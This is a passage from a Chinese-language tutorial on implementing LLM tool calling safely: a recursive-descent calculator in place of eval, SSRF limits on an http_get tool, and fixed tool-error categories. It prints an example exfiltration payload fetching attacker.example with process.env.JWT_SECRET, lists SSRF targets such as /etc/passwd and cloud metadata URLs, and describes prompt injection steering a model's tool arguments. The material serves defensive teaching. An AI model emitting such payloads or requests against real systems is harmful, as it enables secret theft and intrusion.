`eval` 会在**当前作用域**执行任意 JavaScript。而 `expression` 来自**模型**，模型的输出又可能被**用户输入**或**网页内容**影响（prompt injection）。攻击者只要让模型输出：

```
process.exit(1)
```

或

```
(fetch("http://attacker.example/?d=" + process.env.JWT_SECRET), 0)
```

你的服务就**执行了任意代码**。这不是「算错数」的 bug，而是 **RCE（远程代码执行）**。

`new Function(expression)` 同样危险——它只是换了个语法，仍然把字符串当代码编译、仍然能访问全局对象。**任何「把字符串当代码执行」的 API 都不能用来处理不可信输入。**

### 19.2 正确思路：白名单语法 + 手写解析

`calculator` 的需求其实很小：`+ - * /`、括号、小数、一元负号。这可以用一个**递归下降解析器**精确实现——解析器只认识文法里列出的字符，**文法里没有的东西（标识符、函数调用、属性访问、分号）根本无法表达**：

```
expression := term (('+' | '-') term)*
term       := unary (('*' | '/') unary)*
unary      := ('+' | '-') unary | primary
primary    := '(' expression ')' | number
number     := digit+ ('.' digit+)?
```

这是**白名单**，不是黑名单：不枚举「禁止 `process`、禁止 `require`」，而是「**只允许这几种字符和结构**」。黑名单永远漏，白名单不会。

### 19.3 走查两个例子

**例 1：`2+3*4`**

```
parseExpression
  parseTerm         → parseUnary → parsePrimary → 2
  看到 '+'，吃一个 term
    parseTerm
      parseUnary → 3
      看到 '*'，吃一个 unary → 4 → 3*4 = 12
    → 2 + 12 = 14
整体结束，位置到达末尾 ✓
```

**例 2：`-(2+3)/5`**

```
parseExpression
  parseTerm
    parseUnary
      看到 '-' → -(parseUnary)
        parsePrimary 看到 '(' → parseExpression → 2+3 = 5
        ')' 消费掉 → 返回 -5
    看到 '/' → 除以 5 → -1
```

**例 3：`2+`（实测报错）**

```
parseExpression → parseTerm → 2
看到 '+' → 消费 → parseTerm
  parseUnary → parsePrimary → parseNumber
    位置已在末尾 → text === '' → throw ToolError('invalid arguments')
```

**例 4：`2+3abc`**

`parseExpression` 算出 `5` 后返回；`parse()` 收尾时发现 `position` 还停在 `a`（**没到末尾**）→ `invalid arguments`。字母在文法里**没有任何产生式**，所以解析器根本不会「跳过」它们。

### 19.4 除零与浮点噪声

- `if (divisor === 0) throw ...`：除以 0 不算「无穷大」，算**非法输入**（避免 `Infinity` 被序列化成 `"Infinity"` 这种非 JSON 值）。
- `formatNumber` 用 `toPrecision(12)`：`0.1 + 0.2` 的二进制浮点结果是 `0.30000000000000004`，截到 12 位有效数字后再转字符串得到 `"0.3"`。这让两端（JS number / Python float）更容易得到**相同字符串**。
- `-0` 归一成 `"0"`：JSON 里 `-0` 虽然合法，但 `String(-0)` 是 `"0"`，这里显式处理避免歧义。

### 19.5 与 `description` 的一致性

工具描述写「支持 `+ - * /`、括号、小数与一元负号」——**这正是文法的全部**。没有 `%`、没有 `^`、没有 `1e3` 科学计数法。**描述与实现的能力边界必须一致**：描述里说支持而实现不支持，模型会一直调用失败；实现支持而描述没写，模型永远想不起来用。

## 20. 【技术教学 · 首次】`http_get`：工具是攻击面，SSRF 防护

### 20.1 为什么「工具」天然是攻击面

`calculator` 的输入只影响一个数字；`http_get` 的输入能**让你的服务器发请求**。这意味着攻击者获得了一个**代理**：他不能直接访问你的内网，但可以让**你的服务器**替他访问。

这类攻击叫 **SSRF（Server-Side Request Forgery，服务端请求伪造）**。典型目标：

| 目标 | 攻击者能得到什么 |
| --- | --- |
| `file:///etc/passwd` | 读服务器本地文件 |
| `http://169.254.169.254/latest/meta-data/iam/...` | 云环境的实例元数据、临时凭证 |
| `http://127.0.0.1:5432` | 探测/操作内网服务 |
| `http://internal-admin/api/...` | 绕过防火墙访问内网接口 |

而攻击者**不需要直接给你发请求**：他只要在对话里诱导模型（prompt injection），让模型生成一个 `<img src="http://169.254.169.254/...">` 或一段网页内容，模型就可能把它填进 `http_get` 的 `url`。**模型是「不可信输入的搬运工」**。

### 20.2 本项目做了三道防线

| 防线 | 实现 | 对应 `reason` |
| --- | --- | --- |
| **协议白名单** | 只允许 `http:` / `https:` | `not allowed` |
| **超时** | `AbortController` + 5s | `timeout` |
| **响应体上限** | 流式读取，超过 64KB 即中止 | `too large` |

外加「参数非法」→ `invalid arguments`、「其它异常」→ `error`。

**协议白名单为什么能挡 `file://`**：`new URL('file:///etc/passwd').protocol === 'file:'`，白名单判定失败 → `not allowed`。这行判断就挡住了「读本地文件」这一整类攻击。

**超时为什么必要**：没有超时，一个「只连接不响应」的地址会占住连接直到 TCP 超时（可能几分钟），工具调用会把整个 `/run` 流拖死。

**体积上限为什么必要**：一个 10GB 的下载会把 Node 进程内存打满。代码在**读取过程中**计数并 `reader.cancel()`，而不是「读完再判断」——后者已经太晚。

### 20.3 错误怎么归类

```ts
} catch (error) {
  if (error instanceof ToolError) throw error       // too large 等，原样保留
  if (isAbortError(error)) throw new ToolError('timeout')
  throw new ToolError('error')                      // DNS 失败、连接被拒、解析错…
}
```

顺序很重要：**先放过自己的 `ToolError`**，再判 `AbortError`，最后兜底。否则 `too large` 会被 `error` 覆盖。

### 20.4 诚实说明：这只是「第一道防线」

本实现**没有**做：

- **IP / 域名白名单**：`http://127.0.0.1:...`、`http://169.254.169.254/...` 仍会发出去；
- **端口限制**：任意端口都行；
- **重定向复检**：`fetch` 默认跟随重定向，Python 侧 `follow_redirects=True`；一个公网 URL 可以 302 到内网地址。

生产级做法通常是：**把出网请求关进一个代理**（egress proxy），在代理层做 DNS 解析 + IP 段拒绝 + 端口白名单；工具本身只允许访问代理。本项目刻意不做——因为教学重点是「**工具是攻击面**」这个意识，以及「**错误要可分类**」这套工程习惯。契约里 `not allowed` 的措辞是「**URL 协议或目标不被允许**」，给将来加 IP 校验留了位置。

> 一句话：**「只允许 http/https」挡的是协议层，不是网络层。** 不要把「能挡 `file://`」误当成「挡住了 SSRF」。

## 21. 【技术教学 · 首次】`get_current_time`：无参数工具与统一时间格式

### 21.1 无参数工具的 schema 长什么样

```json
{
  "type": "object",
  "properties": {},
  "additionalProperties": false
}
```

- `properties: {}`：没有参数；
- `additionalProperties: false`：模型不该塞任何字段；
- 模型若硬塞（如 `{"timezone":"Asia/Shanghai"}`），函数**根本不读 `args`**，直接忽略——这是最安全的处理方式。

### 21.2 为什么不让模型传时间/时区

- 「现在几点」是**客观事实**，由运行环境提供才准确；模型没有时钟，训练数据里的时间早已过期。
- 让模型传时区会引入一个不必要的参数面：时区名可能非法、可能有歧义。**能用环境确定的，就不要交给模型。**

### 21.3 为什么输出 UTC 毫秒 `Z`

`new Date().toISOString()` 永远返回 **UTC**、**毫秒精度**、**以 `Z` 结尾**、**固定 24 字符**（如 `2026-10-20T08:12:34.567Z`）。这与全站时间规范一致（阶段 2 已把 Python 的 `iso_z()` 对齐到同一形状，见 `02-应用管理/07`）。好处：

- 两台后端的工具输出形状一致，`tool_result.result` 可逐字节比对；
- 前端不需要猜时区；
- 与 `/health.time`、`createdAt`、`publishedAt` 是**同一种格式**，全站只有一套时间解析逻辑。

> 注意：工具返回的是**字符串**，不是日期对象。`tool_result.result` 一律字符串（契约 §3.1），所以这里天然满足。

## 22. 【技术教学 · 首次】工具错误的固定分类：为什么错误也要「归档」

### 22.1 五个固定 `reason`

| `reason` | 含义 | 本项目触发例 |
| --- | --- | --- |
| `invalid arguments` | 参数不合法 / 解析失败 | `calculator` 收到 `2+`、`http_get` 收到非 URL |
| `timeout` | 工具执行超时 | `http_get` 5s 未完成 |
| `not allowed` | URL 协议或目标不被允许 | `http_get` 收到 `file:///etc/passwd` |
| `too large` | 响应体超过大小上限 | `http_get` 收到 > 64KB 响应 |
| `error` | 其它错误 | DNS 失败、连接被拒 |

最终文案由引擎统一拼：

```
tool {name} failed: {reason}
```

例如：

```
tool calculator failed: invalid arguments
tool http_get failed: not allowed
```

（引擎侧的实现位置：`apps/api-ts/src/engine/engine.service.ts` 的 `executeToolOrFail`，它把 `ToolError.reason` 或兜底的 `'error'` 拼成 `RunError`。）

### 22.2 为什么必须归档（三个理由）

| 理由 | 说明 |
| --- | --- |
| **两端逐字节一致** | 工具内部抛出的原始错误千奇百怪：Node 的 `TypeError: Failed to fetch`、Python 的 `httpx.ConnectError: [Errno 111] Connection refused`。**不归一，两台后端永远不可能输出同一句 `message`** |
| **上层可处理** | 前端可以按 `reason` 显示不同提示；未来的重试策略可以「`timeout` 重试、`not allowed` 不重试」；监控可以按 `reason` 打点。若只有自由文本，上层只能**字符串匹配**，一改文案就崩 |
| **不泄露内部信息** | 原始错误可能带库名、路径、内网 IP。归档后只暴露「哪一类错误」，不暴露细节 |

这与阶段 5 的 LLM 错误映射（6 条规范文案、不透出库原始 message）是**同一条原则**：**外部依赖的错误必须经过你自己的「翻译层」，不能直接透出**（见 `05-LLM节点/03`）。

### 22.3 错误发生在哪一层，就走哪条通道

| 发现时机 | 例子 | 通道 | HTTP 状态 |
| --- | --- | --- | --- |
| **运行前预检** | `data.tools` 里有未注册的名字 | 普通 JSON `ErrorResponse` | **400** |
| **执行中（工具内部）** | `2+`、超时、`file://`、超大响应 | SSE 流内 `run_failed` | **200**（流已开始） |
| **执行中（轮次超限）** | 超过 `MAX_TOOL_ROUNDS` | SSE 流内 `run_failed` | **200** |

**为什么未知工具要在预检就 400**：

- 这是**配置错误**，不是运行时偶发。等到模型真的调用时才报，用户已经等了若干秒、消耗了 token，还看了一段「半截」的流；
- 阶段 4 已确立「**先校验、后开流**」：能提前发现的错误，一律不进流（见 `04-执行引擎/05`）。

### 22.4 `ToolError` 为什么只带 `reason` 不带原始信息

```ts
export class ToolError extends Error {
  constructor(readonly reason: ToolFailureReason) {
    super(reason)
  }
}
```

- 原始错误（`error.cause`、堆栈）**留在工具内部**，用于本地调试（可以 `console.error`，但**不能**进契约文案）。
- 对外只有 `reason`，因此**两端文案必然一致**。
- 类型是字面量联合，**写错编译不过**——把「错误分类」变成编译期约束。

## 23. 【技术教学 · 首次】`LlmNodeData.tools`：工具由节点配置声明

### 23.1 三个层次，缺一不可

| 层 | 位置 | 作用 |
| --- | --- | --- |
| **能力目录**（全局） | `TOOL_DEFINITIONS` + `GET /tools` | 这一版**有哪些工具** |
| **节点声明**（局部） | `llm.data.tools: string[]` | 这个节点**启用哪几个** |
| **执行分派** | `executeTool(name, args)` | 真正**跑哪个函数** |

三者用**工具名**串起来：目录提供名字，节点引用名字，执行按名字查表。**图数据里不存工具实现，只存名字。**

### 23.2 为什么是「节点级」而不是「全局开关」

如果工具是全局环境变量（如 `ENABLE_TOOLS=http_get`），所有 `llm` 节点都会被赋予同样的能力：

- 只想让「客服节点」查天气，结果「代码生成节点」也能发 HTTP；
- 想收紧权限，只能改环境变量、重启服务，**影响所有应用**；
- 图数据无法表达「这个节点不需要工具」。

**节点级声明 = 最小权限**：每个节点只拿到它需要的能力。这和阶段 5 的「`data.model` 覆盖全局 `LLM_MODEL`」是同一种「**局部覆盖/局部声明**」思路——**默认不启用，按节点开启**。

### 23.3 空值语义：向后兼容

```ts
tools?: string[]   // 不写 或 []
```

- **不写**：阶段 5 的行为（纯文本模型调用）；
- **`[]`**：同样不启用；
- **非空**：启用列出的工具。

这让阶段 5 的所有图**无需修改**即可继续运行——**加字段而不是改语义**，是契约演进的基本功。

### 23.4 预检：运行前就把错名字挡住

契约文案：

```
llm node {nodeId} references unknown tool: {name}
```

实测（`llm1` 引用 `xxx`）：

```json
{"statusCode":400,"message":"llm node llm1 references unknown tool: xxx","error":"Bad Request"}
```

实现位置（引擎预检，非本篇源码，但**行为由注册表决定**）：

```ts
// apps/api-ts/src/engine/engine.service.ts（节选）
if (Array.isArray(data.tools)) {
  for (const name of data.tools) {
    if (typeof name !== 'string' || !hasTool(name)) {
      errors.push(`llm node ${node.id} references unknown tool: ${String(name)}`)
    }
  }
}
```

**为什么放在 `prompt` 校验之后、且合并进同一条 `message`**：契约 §6.1 明确「工具校验紧随该节点的 `prompt` 校验之后」，多个错误用 `"; "` 连接。这样同一张图出多个错时，两端的报错**顺序与文本完全一致**。

### 23.5 轮次上限：循环必须有刹车

ReAct 是一个**环**。环必须有终止条件：

- **正常终止**：模型某轮不再返回 `tool_calls` → 发 `node_finished`；
- **异常终止**：超过 `MAX_TOOL_ROUNDS`（默认 5）→ `run_failed` `tool call rounds exceeded: {max}`。

没有上限，模型可能「调用工具 → 看到结果 → 再调用同一个工具」无限循环，烧钱且永不结束。**上限是契约的一部分**（写在 `sse-events.md` §4），不是实现细节。

> 「逐字段相等」比「逐字节相等」更严格地贴合语义：键顺序不要求一致（`sse-events.md` §1 的同一条原则）。这三个定义的键顺序恰好也一致，但**不要依赖**键顺序。

## 25. 常见坑

| 坑 | 现象 | 原因 / 解决 |
| --- | --- | --- |
| PowerShell 里 `curl` 不是 curl | 输出一大段 `StatusCode` / `RawContent`，`-H` 报错 | PowerShell 5 的 `curl` 是 `Invoke-WebRequest` 别名。写 **`curl.exe`**；或用 `Invoke-RestMethod` |
| 忘记 `Authorization` | `/tools` 返回 401 | `/tools` 要登录；`Missing bearer token` 就是没带令牌 |
| 用 `eval` 实现 calculator | 本地「能算」，一上线就是 RCE | 工具参数来自模型、模型可被注入。**任何字符串都当不可信输入**，用白名单文法解析（§19） |
| 以为「只允许 http/https」就挡住了 SSRF | 内网地址仍能访问 | 协议白名单只挡 `file:` 等；`127.0.0.1` / `169.254.169.254` / 重定向仍需 IP 层防护（§20.4） |
| 响应体上限在「读完之后」判断 | 大文件先把内存吃满再报 `too large` | 必须**边读边计数**，超限立刻 `reader.cancel()`（§12） |
| 超时后没清定时器 | 进程/连接迟迟不释放，测试进程不退出 | `finally { clearTimeout(timer) }`（§12） |
| 把 `arguments` 当对象直接读 | 运行时报「`arguments.expression` 是 undefined」 | provider 返回的 `arguments` 是**字符串**（且可能分片），先拼接再 `JSON.parse`；解析失败归 `invalid arguments`（§15.4） |
| 让模型自己拼工具定义 | 两台后端返回的 `/tools` 不一致，模型行为飘 | 定义只放在 `registry`（TS）/ `registry.py`（Py）各一份，**逐字段对齐**；不要在前端或提示词里另抄一份 |
| 工具名写错但等到运行时才报 | 白等几秒 + 烧 token + 半截流 | 预检 `hasTool` 必须 400（§22.3、§23.4） |
| 把 `tools` 写成对象数组 | 预检报 `references unknown tool: [object Object]` | 契约是 `string[]`，只存**名字** |
| mock 标记里的 JSON 没转义 | 图 JSON 解析失败 / mock 收到坏参数 | `prompt` 是 JSON 字符串，内部双引号要写成 `\"`（§24.5 的 `tool-bad.json` 就是范例） |
| 以为 `/tools` 是公开接口 | 加个前端页面直接 `fetch` 却没带 token → 401 | 与 `/apps` 同级，必须带 Bearer（§18.4） |
| 描述写得太泛 | 模型乱选工具，或该用不用 | `description` 是**给模型的提示词**，写清能力与限制（§16.2） |
| 把 JSON Schema 当强制校验 | 模型传了多余字段，工具直接崩 | Schema 只提示；**运行期必须自己校验** `typeof` / 非空（§17.3） |
| 改了工具描述却忘了重编契约 | 前端拿到的还是旧描述 | 描述在 `registry`，不在契约；`/tools` 直接读注册表，**重启后端**即可，无需重编契约 |

## 26. 本篇技术点登记（同步到 `docs/tutorial/INDEX.md`）

| 技术点 | 说明 | 登记 |
| --- | --- | --- |
| **Function Calling / Tool Calling 的分工** | 模型只**返回意图**（`tool_calls`：工具名 + JSON 参数），**程序负责执行**并把结果作为 `ToolMessage` 回灌；ReAct 循环 = Reason → Act → Observe；`arguments` 是字符串、`id` 要原样回传、可并行调用 | **首次教学于本篇** |
| **`ToolDefinition` 三要素与「`description` 是给模型看的」** | `name`（模型回传 + 程序分派）/ `description`（模型据此决定用不用）/ `parameters`（JSON Schema）；描述要写清能力边界、限制、输出格式，是**产品逻辑**不是注释 | **首次教学于本篇** |
| **JSON Schema 作为「给模型的函数签名」** | 与 TS（编译器读、编译后擦除）、Pydantic（运行期校验）对照：JSON Schema 是**数据**、能跨语言随请求体传给 provider，但**不构成强制**；本项目用手写 `typeof` 校验补上运行期强制 | **首次教学于本篇** |
| **`GET /tools` 能力目录接口** | 前端据此渲染勾选列表、后端据此预检、执行据此分派；**目录与执行共用一份注册表**（`TOOL_DEFINITIONS`），避免三处漂移；需要鉴权；两端 JSON 逐字段相等 | **首次教学于本篇** |
| **`calculator`：禁用 `eval`/`Function` + 手写递归下降解析器** | 工具参数不可信（模型可被注入），`eval` = RCE；改用白名单文法 `expression/term/unary/primary/number`，调用层级即优先级；`2+`、`2+3abc`、除零一律 `invalid arguments`；`toPrecision(12)` 消浮点噪声 | **首次教学于本篇** |
| **`http_get`：SSRF 首道防线 + 「工具是攻击面」** | 协议白名单（只 `http/https`，挡 `file://`）、5s 超时（`AbortController`）、64KB 流式上限；错误归一为 `timeout` / `too large` / `error`；**明确未做 IP/端口/重定向校验**，生产需 egress proxy | **首次教学于本篇** |
| **`get_current_time`：无参数工具 + UTC 毫秒 `Z`** | `properties: {}` + `additionalProperties: false`；时间由环境提供而非模型；输出与全站 `iso_z` 同规范（24 字符、UTC、毫秒） | **首次教学于本篇** |
| **工具错误的固定分类** | 5 个 `reason`（`invalid arguments` / `timeout` / `not allowed` / `too large` / `error`）；引擎统一拼 `tool {name} failed: {reason}`；归档的理由：两端逐字节一致、上层可分支、不泄露内部信息；预检 400 vs 流内 `run_failed` 的双通道 | **首次教学于本篇** |
| **`LlmNodeData.tools?: string[]`：工具由节点声明** | 图里只存工具名，定义在目录；不填/空数组 = 阶段 5 行为（向后兼容）；节点级 = 最小权限；预检 `references unknown tool` 400；`MAX_TOOL_ROUNDS` 为循环刹车 | **首次教学于本篇** |
